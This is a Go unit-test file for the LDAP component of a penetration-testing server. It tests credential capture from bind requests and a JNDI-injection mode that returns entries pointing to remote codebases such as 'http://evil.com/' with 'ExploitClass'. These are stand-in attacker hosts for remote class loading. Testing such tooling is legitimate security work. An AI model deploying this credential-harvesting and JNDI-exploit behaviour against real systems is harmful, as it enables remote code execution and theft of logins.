package ldapserver

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"net"
	"os"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"goshs.de/goshs/v2/ca"
	"goshs.de/goshs/v2/options"
	"goshs.de/goshs/v2/ws"
)

// ─── helpers ───────────────────────────────────────────────────────────────────

func newTestHub() *ws.Hub {
	return &ws.Hub{
		Broadcast: make(chan []byte, 64),
		HTTPLog:   ws.NewRingBuffer(100),
		DNSLog:    ws.NewRingBuffer(100),
		SMTPLog:   ws.NewRingBuffer(100),
		SMBLog:    ws.NewRingBuffer(100),
		LDAPLog:   ws.NewRingBuffer(100),
	}
}

func drainBroadcast(hub *ws.Hub) []map[string]interface{} {
	var msgs []map[string]interface{}
	for {
		select {
		case raw := <-hub.Broadcast:
			var m map[string]interface{}
			if err := json.Unmarshal(raw, &m); err == nil {
				msgs = append(msgs, m)
			}
		default:
			return msgs
		}
	}
}

// startTestServer starts an LDAPServer on a random port and returns the server
// and the listening address. The caller should defer closing ln.
func startTestServer(t *testing.T, srv *LDAPServer) (ln net.Listener, addr string) {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	require.NoError(t, err)
	addr = ln.Addr().String()

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go newSession(conn, srv).handle()
		}
	}()

	return ln, addr
}

// startTestServerTLS is like startTestServer but wraps the listener in TLS.
func startTestServerTLS(t *testing.T, srv *LDAPServer, tlsConf *tls.Config) (ln net.Listener, addr string) {
	t.Helper()
	rawLn, err := net.Listen("tcp", "127.0.0.1:0")
	require.NoError(t, err)
	ln = tls.NewListener(rawLn, tlsConf)
	addr = ln.Addr().String()

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go newSession(conn, srv).handle()
		}
	}()

	return ln, addr
}

// dial dials the given address and returns a connection with a read deadline.
func dial(t *testing.T, network, addr string) net.Conn {
	t.Helper()
	conn, err := net.DialTimeout(network, addr, 2*time.Second)
	require.NoError(t, err)
	t.Cleanup(func() { conn.Close() })
	return conn
}

// readResponse reads one LDAP response envelope from the connection.
func readResponse(t *testing.T, conn net.Conn) (msgID int, payload []byte) {
	t.Helper()
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	tag, data, err := readTLV(bufio.NewReader(conn))
	require.NoError(t, err, "reading LDAP response")
	require.Equal(t, byte(tagSequence), tag, "expected SEQUENCE wrapper")

	r := newBytesReader(data)
	mTag, mData, err := readTLV(r)
	require.NoError(t, err)
	require.Equal(t, byte(tagInteger), mTag)
	msgID = asInt(mData)

	rest, _ := ioReadAll(r)
	return msgID, rest
}

func ioReadAll(r *bytesReader) ([]byte, error) {
	var buf []byte
	for {
		b := make([]byte, 4096)
		n, err := r.Read(b)
		buf = append(buf, b[:n]...)
		if err != nil {
			return buf, err
		}
	}
}

// buildBindRequest constructs a raw LDAP simple bind request.
func buildBindRequest(msgID int, dn, password string) []byte {
	return berSeq(
		berInt(msgID),
		tlv(tagBindReq, cat(
			berInt(3),       // LDAP version
			berStr(dn),      // DN
			tlv(tagCtxPrim0, []byte(password)), // simple auth
		)),
	)
}

// buildSearchRequest constructs a raw LDAP search request.
func buildSearchRequest(msgID int, baseDN string) []byte {
	return berSeq(
		berInt(msgID),
		tlv(tagSearchReq, cat(
			berStr(baseDN),    // baseObject
			berEnum(0),        // scope: baseObject
			berEnum(0),        // derefAliases: never
			berInt(0),         // sizeLimit
			berInt(0),         // timeLimit
			berEnum(0),        // typesOnly: false
			tlv(tagOctetString, []byte("(objectClass=*)")), // filter (present)
		)),
	)
}

// buildSASLBindRequest constructs a raw LDAP SASL bind request.
func buildSASLBindRequest(msgID int, dn, mechanism string, credentials []byte) []byte {
	saslContent := cat(berStr(mechanism))
	if credentials != nil {
		saslContent = cat(saslContent, tlv(tagOctetString, credentials))
	}
	return berSeq(
		berInt(msgID),
		tlv(tagBindReq, cat(
			berInt(3),
			berStr(dn),
			tlv(tagCtxCons3, saslContent),
		)),
	)
}

// buildUnbindRequest constructs a raw LDAP unbind request.
func buildUnbindRequest() []byte {
	return berSeq(berInt(0), tlv(tagUnbindReq, nil))
}

// bytesReader is a trivial io.Reader over a byte slice.
type bytesReader struct {
	data []byte
	pos  int
}

func newBytesReader(data []byte) *bytesReader { return &bytesReader{data: data} }

func (r *bytesReader) Read(p []byte) (int, error) {
	if r.pos >= len(r.data) {
		return 0, fmt.Errorf("EOF")
	}
	n := copy(p, r.data[r.pos:])
	r.pos += n
	return n, nil
}

// ─── BER / protocol helpers ────────────────────────────────────────────────────

func TestBERLength_Short(t *testing.T) {
	r := newBytesReader([]byte{0x05})
	l, err := readBERLength(r)
	require.NoError(t, err)
	require.Equal(t, 5, l)
}

func TestBERLength_OneByteExtended(t *testing.T) {
	r := newBytesReader([]byte{0x81, 0x80})
	l, err := readBERLength(r)
	require.NoError(t, err)
	require.Equal(t, 128, l)
}

func TestBERLength_TwoByteExtended(t *testing.T) {
	r := newBytesReader([]byte{0x82, 0x01, 0x00})
	l, err := readBERLength(r)
	require.NoError(t, err)
	require.Equal(t, 256, l)
}

func TestBERLength_ZeroExtraBytes(t *testing.T) {
	r := newBytesReader([]byte{0x80})
	_, err := readBERLength(r)
	require.Error(t, err)
	require.Contains(t, err.Error(), "unsupported")
}

func TestBERLength_TooManyExtraBytes(t *testing.T) {
	r := newBytesReader([]byte{0x85})
	_, err := readBERLength(r)
	require.Error(t, err)
}

func TestBERLength_UnexpectedEOF(t *testing.T) {
	r := newBytesReader([]byte{0x82, 0x01})
	_, err := readBERLength(r)
	require.Error(t, err)
}

func TestReadTLV(t *testing.T) {
	// tag=0x04 (octet string), length=5, value="hello"
	r := newBytesReader([]byte{0x04, 0x05, 'h', 'e', 'l', 'l', 'o'})
	tag, val, err := readTLV(r)
	require.NoError(t, err)
	require.Equal(t, byte(0x04), tag)
	require.Equal(t, []byte("hello"), val)
}

func TestReadTLV_EOF(t *testing.T) {
	r := newBytesReader(nil)
	_, _, err := readTLV(r)
	require.Error(t, err)
}

func TestAsInt(t *testing.T) {
	require.Equal(t, 0, asInt(nil))
	require.Equal(t, 1, asInt([]byte{0x01}))
	require.Equal(t, 256, asInt([]byte{0x01, 0x00}))
	require.Equal(t, 65535, asInt([]byte{0xFF, 0xFF}))
}

func TestEncLen(t *testing.T) {
	require.Equal(t, []byte{0x00}, encLen(0))
	require.Equal(t, []byte{0x7F}, encLen(127))
	require.Equal(t, []byte{0x81, 0x80}, encLen(128))
	require.Equal(t, []byte{0x81, 0xFF}, encLen(255))
	require.Equal(t, []byte{0x82, 0x01, 0x00}, encLen(256))
}

func TestTLV(t *testing.T) {
	out := tlv(0x04, []byte("abc"))
	require.Equal(t, []byte{0x04, 0x03, 'a', 'b', 'c'}, out)
}

func TestBerStr(t *testing.T) {
	out := berStr("hi")
	require.Equal(t, []byte{0x04, 0x02, 'h', 'i'}, out)
}

func TestBerInt_Small(t *testing.T) {
	out := berInt(5)
	require.Equal(t, []byte{0x02, 0x01, 0x05}, out)
}

func TestBerInt_Large(t *testing.T) {
	out := berInt(256)
	require.Equal(t, []byte{0x02, 0x02, 0x01, 0x00}, out)
}

func TestBerEnum(t *testing.T) {
	out := berEnum(0)
	require.Equal(t, []byte{0x0a, 0x01, 0x00}, out)
}

func TestBerSeq(t *testing.T) {
	out := berSeq(berInt(1), berStr("x"))
	expected := []byte{0x30, 0x06, 0x02, 0x01, 0x01, 0x04, 0x01, 'x'}
	require.Equal(t, expected, out)
}

func TestBerSet(t *testing.T) {
	out := berSet(berStr("a"))
	require.Equal(t, byte(0x31), out[0])
}

// ─── response builders ─────────────────────────────────────────────────────────

func TestBuildBindResponse(t *testing.T) {
	raw := buildBindResponse(42)
	tag, data, err := readTLV(newBytesReader(raw))
	require.NoError(t, err)
	require.Equal(t, byte(tagSequence), tag)

	r := newBytesReader(data)
	mTag, mData, err := readTLV(r)
	require.NoError(t, err)
	require.Equal(t, byte(tagInteger), mTag)
	require.Equal(t, 42, asInt(mData))

	opTag, opData, err := readTLV(r)
	require.NoError(t, err)
	require.Equal(t, byte(tagBindResp), opTag)

	inner := newBytesReader(opData)
	eTag, eData, err := readTLV(inner)
	require.NoError(t, err)
	require.Equal(t, byte(tagEnum), eTag)
	require.Equal(t, 0, asInt(eData)) // resultCode = success
}

func TestBuildSASLBindResponse_WithCreds(t *testing.T) {
	creds := []byte{0xAA, 0xBB}
	raw := buildSASLBindResponse(7, 14, creds)

	tag, data, err := readTLV(newBytesReader(raw))
	require.NoError(t, err)
	require.Equal(t, byte(tagSequence), tag)

	r := newBytesReader(data)
	_, _, _ = readTLV(r) // skip msgID

	opTag, opData, err := readTLV(r)
	require.NoError(t, err)
	require.Equal(t, byte(tagBindResp), opTag)

	inner := newBytesReader(opData)
	eTag, eData, err := readTLV(inner)
	require.NoError(t, err)
	require.Equal(t, byte(tagEnum), eTag)
	require.Equal(t, 14, asInt(eData)) // saslBindInProgress
}

func TestBuildSearchDone(t *testing.T) {
	raw := buildSearchDone(10, 0)
	tag, data, err := readTLV(newBytesReader(raw))
	require.NoError(t, err)
	require.Equal(t, byte(tagSequence), tag)

	r := newBytesReader(data)
	_, mData, _ := readTLV(r)
	require.Equal(t, 10, asInt(mData))

	opTag, _, err := readTLV(r)
	require.NoError(t, err)
	require.Equal(t, byte(tagSearchDone), opTag)
}

func TestBuildJNDIEntry(t *testing.T) {
	raw := buildJNDIEntry(5, "cn=Exploit", "ExploitClass", "http://evil.com/")
	tag, data, err := readTLV(newBytesReader(raw))
	require.NoError(t, err)
	require.Equal(t, byte(tagSequence), tag)

	r := newBytesReader(data)
	_, mData, _ := readTLV(r)
	require.Equal(t, 5, asInt(mData))

	opTag, opData, err := readTLV(r)
	require.NoError(t, err)
	require.Equal(t, byte(tagSearchEntry), opTag)

	// Verify the entry contains the DN and some attribute data
	s := string(opData)
	require.Contains(t, s, "cn=Exploit")
	require.Contains(t, s, "ExploitClass")
	require.Contains(t, s, "http://evil.com/")
}

// ─── session integration (plain TCP) ───────────────────────────────────────────

func TestSimpleBind_Captured(t *testing.T) {
	hub := newTestHub()
	srv := &LDAPServer{Hub: hub}
	ln, addr := startTestServer(t, srv)
	defer ln.Close()

	conn := dial(t, "tcp", addr)
	_, err := conn.Write(buildBindRequest(1, "cn=admin,dc=test", "s3cret"))
	require.NoError(t, err)

	msgID, payload := readResponse(t, conn)
	require.Equal(t, 1, msgID)
	require.Equal(t, byte(tagBindResp), payload[0])

	msgs := drainBroadcast(hub)
	require.Len(t, msgs, 1)
	require.Equal(t, "ldap", msgs[0]["type"])
	require.Equal(t, "bind", msgs[0]["operation"])
	require.Equal(t, "cn=admin,dc=test", msgs[0]["dn"])
	require.Equal(t, "s3cret", msgs[0]["password"])
}

func TestAnonymousBind_NoBroadcast(t *testing.T) {
	hub := newTestHub()
	srv := &LDAPServer{Hub: hub}
	ln, addr := startTestServer(t, srv)
	defer ln.Close()

	conn := dial(t, "tcp", addr)
	_, err := conn.Write(buildBindRequest(1, "", ""))
	require.NoError(t, err)

	// Read the response (server still replies success)
	msgID, _ := readResponse(t, conn)
	require.Equal(t, 1, msgID)

	msgs := drainBroadcast(hub)
	require.Len(t, msgs, 0, "anonymous bind should not broadcast")
}

func TestSearch_Captured(t *testing.T) {
	hub := newTestHub()
	srv := &LDAPServer{Hub: hub}
	ln, addr := startTestServer(t, srv)
	defer ln.Close()

	conn := dial(t, "tcp", addr)
	_, err := conn.Write(buildSearchRequest(2, "dc=example,dc=com"))
	require.NoError(t, err)

	msgID, payload := readResponse(t, conn)
	require.Equal(t, 2, msgID)
	require.Equal(t, byte(tagSearchDone), payload[0])

	msgs := drainBroadcast(hub)
	require.Len(t, msgs, 1)
	require.Equal(t, "ldap", msgs[0]["type"])
	require.Equal(t, "search", msgs[0]["operation"])
	require.Equal(t, "dc=example,dc=com", msgs[0]["dn"])
}

func TestSearch_EmptyBaseDN_NoBroadcast(t *testing.T) {
	hub := newTestHub()
	srv := &LDAPServer{Hub: hub}
	ln, addr := startTestServer(t, srv)
	defer ln.Close()

	conn := dial(t, "tcp", addr)
	_, err := conn.Write(buildSearchRequest(3, ""))
	require.NoError(t, err)

	msgID, payload := readResponse(t, conn)
	require.Equal(t, 3, msgID)
	require.Equal(t, byte(tagSearchDone), payload[0])

	msgs := drainBroadcast(hub)
	require.Len(t, msgs, 0, "empty baseDN (rootDSE) should not broadcast")
}

func TestUnbind_ClosesConnection(t *testing.T) {
	hub := newTestHub()
	srv := &LDAPServer{Hub: hub}
	ln, addr := startTestServer(t, srv)
	defer ln.Close()

	conn := dial(t, "tcp", addr)
	_, err := conn.Write(buildUnbindRequest())
	require.NoError(t, err)

	// Server should close the connection; a subsequent write should fail.
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	_, err = conn.Write(buildBindRequest(99, "cn=x", "y"))
	// May succeed once if the write races the close, so try a second time.
	if err == nil {
		time.Sleep(100 * time.Millisecond)
		conn.Write(buildBindRequest(100, "cn=x", "y"))
	}

	msgs := drainBroadcast(hub)
	require.Len(t, msgs, 0, "unbind should not broadcast")
}

func TestSearch_JNDIEntryReturned(t *testing.T) {
	hub := newTestHub()
	srv := &LDAPServer{
		Hub:          hub,
		JNDIEnabled:  true,
		JNDICodeBase: "http://127.0.0.1:8000/",
	}
	ln, addr := startTestServer(t, srv)
	defer ln.Close()

	conn := dial(t, "tcp", addr)
	_, err := conn.Write(buildSearchRequest(4, "ExploitClass"))
	require.NoError(t, err)

	// Use a single buffered reader so both responses are read correctly.
	reader := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))

	// First response: SearchResultEntry (0x64)
	tag1, data1, err := readTLV(reader)
	require.NoError(t, err)
	require.Equal(t, byte(tagSequence), tag1)

	r1 := newBytesReader(data1)
	_, _, _ = readTLV(r1) // msgID
	opTag, _, err := readTLV(r1)
	require.NoError(t, err)
	require.Equal(t, byte(tagSearchEntry), opTag, "first response should be a search entry")

	// Second response: SearchResultDone (0x65)
	tag2, data2, err := readTLV(reader)
	require.NoError(t, err)
	require.Equal(t, byte(tagSequence), tag2)

	r2 := newBytesReader(data2)
	_, _, _ = readTLV(r2) // msgID
	opTag2, _, err := readTLV(r2)
	require.NoError(t, err)
	require.Equal(t, byte(tagSearchDone), opTag2, "second response should be search done")
}

func TestSASLPlainBind_Captured(t *testing.T) {
	hub := newTestHub()
	srv := &LDAPServer{Hub: hub}
	ln, addr := startTestServer(t, srv)
	defer ln.Close()

	conn := dial(t, "tcp", addr)
	cred := []byte("\x00user\x00p@ss")
	_, err := conn.Write(buildSASLBindRequest(5, "cn=test", "PLAIN", cred))
	require.NoError(t, err)

	msgID, payload := readResponse(t, conn)
	require.Equal(t, 5, msgID)
	require.Equal(t, byte(tagBindResp), payload[0])

	msgs := drainBroadcast(hub)
	require.Len(t, msgs, 1)
	require.Equal(t, "ldap", msgs[0]["type"])
	require.Equal(t, "bind", msgs[0]["operation"])
	require.Contains(t, msgs[0]["password"], "SASL PLAIN")
	require.Contains(t, msgs[0]["password"], "user")
	require.Contains(t, msgs[0]["password"], "p@ss")
}

func TestMultipleOperations_SameConnection(t *testing.T) {
	hub := newTestHub()
	srv := &LDAPServer{Hub: hub}
	ln, addr := startTestServer(t, srv)
	defer ln.Close()

	conn := dial(t, "tcp", addr)

	// Bind
	_, err := conn.Write(buildBindRequest(1, "cn=admin,dc=test", "pass1"))
	require.NoError(t, err)
	msgID, _ := readResponse(t, conn)
	require.Equal(t, 1, msgID)

	// Search
	_, err = conn.Write(buildSearchRequest(2, "dc=test"))
	require.NoError(t, err)
	msgID, _ = readResponse(t, conn)
	require.Equal(t, 2, msgID)

	msgs := drainBroadcast(hub)
	require.Len(t, msgs, 2)
	require.Equal(t, "bind", msgs[0]["operation"])
	require.Equal(t, "search", msgs[1]["operation"])
}

// ─── NewLDAPServer constructor ─────────────────────────────────────────────────

func TestNewLDAPServer_DefaultPort(t *testing.T) {
	opts := &options.Options{
		IP:       "0.0.0.0",
		Port:     8000,
		LDAPPort: 389,
	}
	srv := NewLDAPServer(opts, nil, nil)
	require.Equal(t, 389, srv.Port)
	require.False(t, srv.SSL)
}

func TestNewLDAPServer_SSLAutoPort636(t *testing.T) {
	opts := &options.Options{
		IP:       "0.0.0.0",
		Port:     8000,
		LDAPPort: 389,
		SSL:      true,
	}
	srv := NewLDAPServer(opts, nil, nil)
	require.Equal(t, 636, srv.Port)
	require.True(t, srv.SSL)
}

func TestNewLDAPServer_SSLExplicitPort(t *testing.T) {
	opts := &options.Options{
		IP:       "0.0.0.0",
		Port:     8000,
		LDAPPort: 1636,
		SSL:      true,
	}
	srv := NewLDAPServer(opts, nil, nil)
	require.Equal(t, 1636, srv.Port, "explicit port should override auto-636")
}

func TestNewLDAPServer_JNDICodeBase_HTTP(t *testing.T) {
	opts := &options.Options{
		IP:              "10.0.0.1",
		Port:            8080,
		LDAPPort:        389,
		LDAPJNDIEnabled: true,
	}
	srv := NewLDAPServer(opts, nil, nil)
	require.Equal(t, "http://10.0.0.1:8080/", srv.JNDICodeBase)
}

func TestNewLDAPServer_JNDICodeBase_HTTPS(t *testing.T) {
	opts := &options.Options{
		IP:              "10.0.0.1",
		Port:            8443,
		LDAPPort:        389,
		LDAPJNDIEnabled: true,
		SSL:             true,
	}
	srv := NewLDAPServer(opts, nil, nil)
	require.Equal(t, "https://10.0.0.1:8443/", srv.JNDICodeBase)
}

func TestNewLDAPServer_JNDICodeBase_Override(t *testing.T) {
	opts := &options.Options{
		IP:              "10.0.0.1",
		Port:            8080,
		LDAPPort:        389,
		LDAPJNDIEnabled: true,
		LDAPJNDIBase:    "http://evil.attacker.com/",
	}
	srv := NewLDAPServer(opts, nil, nil)
	require.Equal(t, "http://evil.attacker.com/", srv.JNDICodeBase)
}

func TestNewLDAPServer_JNDICodeBase_ZeroIP(t *testing.T) {
	opts := &options.Options{
		IP:              "0.0.0.0",
		Port:            8080,
		LDAPPort:        389,
		LDAPJNDIEnabled: true,
	}
	srv := NewLDAPServer(opts, nil, nil)
	require.Contains(t, srv.JNDICodeBase, "127.0.0.1")
}

func TestNewLDAPServer_JNDICodeBase_IPv6Unspecified(t *testing.T) {
	opts := &options.Options{
		IP:              "::",
		Port:            8080,
		LDAPPort:        389,
		LDAPJNDIEnabled: true,
	}
	srv := NewLDAPServer(opts, nil, nil)
	require.Contains(t, srv.JNDICodeBase, "127.0.0.1")
}

func TestNewLDAPServer_Wordlist(t *testing.T) {
	opts := &options.Options{
		IP:           "0.0.0.0",
		Port:         8000,
		LDAPPort:     389,
		LDAPWordlist: "/tmp/words.txt",
	}
	srv := NewLDAPServer(opts, nil, nil)
	require.Equal(t, "/tmp/words.txt", srv.Wordlist)
}

// ─── buildTLSConfig ────────────────────────────────────────────────────────────

func TestBuildTLSConfig_SelfSigned(t *testing.T) {
	srv := &LDAPServer{SSL: true, SelfSigned: true}
	conf := srv.buildTLSConfig()
	require.NotNil(t, conf)
	require.Len(t, conf.Certificates, 1)
	require.Equal(t, uint16(tls.VersionTLS12), conf.MinVersion)
}

// ─── TLS integration (LDAPS) ───────────────────────────────────────────────────

func TestLDAPS_SimpleBind(t *testing.T) {
	hub := newTestHub()
	srv := &LDAPServer{Hub: hub, SSL: true, SelfSigned: true}
	tlsConf := srv.buildTLSConfig()

	ln, addr := startTestServerTLS(t, srv, tlsConf)
	defer ln.Close()

	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 2 * time.Second}, "tcp", addr, &tls.Config{
		InsecureSkipVerify: true,
	})
	require.NoError(t, err)
	defer conn.Close()

	_, err = conn.Write(buildBindRequest(1, "cn=admin,dc=secure", "tls-pass"))
	require.NoError(t, err)

	msgID, payload := readResponse(t, conn)
	require.Equal(t, 1, msgID)
	require.Equal(t, byte(tagBindResp), payload[0])

	msgs := drainBroadcast(hub)
	require.Len(t, msgs, 1)
	require.Equal(t, "bind", msgs[0]["operation"])
	require.Equal(t, "cn=admin,dc=secure", msgs[0]["dn"])
	require.Equal(t, "tls-pass", msgs[0]["password"])
}

func TestLDAPS_SearchWithJNDI(t *testing.T) {
	hub := newTestHub()
	srv := &LDAPServer{
		Hub:          hub,
		SSL:          true,
		SelfSigned:   true,
		JNDIEnabled:  true,
		JNDICodeBase: "https://127.0.0.1:8443/",
	}
	tlsConf := srv.buildTLSConfig()

	ln, addr := startTestServerTLS(t, srv, tlsConf)
	defer ln.Close()

	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 2 * time.Second}, "tcp", addr, &tls.Config{
		InsecureSkipVerify: true,
	})
	require.NoError(t, err)
	defer conn.Close()

	_, err = conn.Write(buildSearchRequest(1, "MaliciousClass"))
	require.NoError(t, err)

	// First response: SearchResultEntry
	reader := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	tag1, data1, err := readTLV(reader)
	require.NoError(t, err)
	require.Equal(t, byte(tagSequence), tag1)
	r := newBytesReader(data1)
	_, _, _ = readTLV(r) // msgID
	opTag, _, _ := readTLV(r)
	require.Equal(t, byte(tagSearchEntry), opTag)
}

func TestPlainTCP_FailsAgainstTLS(t *testing.T) {
	hub := newTestHub()
	srv := &LDAPServer{Hub: hub, SSL: true, SelfSigned: true}
	tlsConf := srv.buildTLSConfig()

	ln, addr := startTestServerTLS(t, srv, tlsConf)
	defer ln.Close()

	conn := dial(t, "tcp", addr)
	defer conn.Close()

	_, err := conn.Write(buildBindRequest(1, "cn=admin", "test"))
	require.NoError(t, err)

	// Plain TCP write to a TLS port: the server expects a TLS handshake,
	// so the raw LDAP bytes will be garbage and the connection will be closed.
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 1024)
	_, err = conn.Read(buf)
	require.Error(t, err, "plain TCP to LDAPS port should fail to get a valid response")

	msgs := drainBroadcast(hub)
	require.Len(t, msgs, 0, "no events should be captured on plain TCP to LDAPS port")
}

// ─── SASL unsupported mechanism ────────────────────────────────────────────────

func TestSASLUnsupportedMech_StillResponds(t *testing.T) {
	hub := newTestHub()
	srv := &LDAPServer{Hub: hub}
	ln, addr := startTestServer(t, srv)
	defer ln.Close()

	conn := dial(t, "tcp", addr)
	_, err := conn.Write(buildSASLBindRequest(1, "cn=test", "DIGEST-MD5", nil))
	require.NoError(t, err)

	msgID, payload := readResponse(t, conn)
	require.Equal(t, 1, msgID)
	require.Equal(t, byte(tagBindResp), payload[0], "unsupported SASL mech should still get a bind response")
}

// ─── TLS with custom cert ──────────────────────────────────────────────────────

func TestBuildTLSConfig_CustomCert(t *testing.T) {
	// Generate a self-signed cert/key pair to temp files
	dir := t.TempDir()
	certPath := dir + "/cert.pem"
	keyPath := dir + "/key.pem"

	// Use ca.Setup() to get a tls.Config, then write cert+key to disk
	tlsConf, _, _, err := ca.Setup()
	require.NoError(t, err)
	cert := tlsConf.Certificates[0]
	require.NoError(t, err)

	// Write cert and key to PEM files
	certPEM, keyPEM := encodeCertPEM(t, &cert)
	require.NoError(t, os.WriteFile(certPath, certPEM, 0644))
	require.NoError(t, os.WriteFile(keyPath, keyPEM, 0600))

	srv := &LDAPServer{SSL: true, MyCert: certPath, MyKey: keyPath}
	built := srv.buildTLSConfig()
	require.NotNil(t, built)
	require.Len(t, built.Certificates, 1)
}

func encodeCertPEM(t *testing.T, cert *tls.Certificate) (certPEM, keyPEM []byte) {
	t.Helper()
	require.Len(t, cert.Certificate, 1)

	var certBuf bytes.Buffer
	err := pem.Encode(&certBuf, &pem.Block{Type: "CERTIFICATE", Bytes: cert.Certificate[0]})
	require.NoError(t, err)

	keyBytes, err := x509.MarshalPKCS8PrivateKey(cert.PrivateKey)
	require.NoError(t, err)

	var keyBuf bytes.Buffer
	err = pem.Encode(&keyBuf, &pem.Block{Type: "PRIVATE KEY", Bytes: keyBytes})
	require.NoError(t, err)

	return certBuf.Bytes(), keyBuf.Bytes()
}
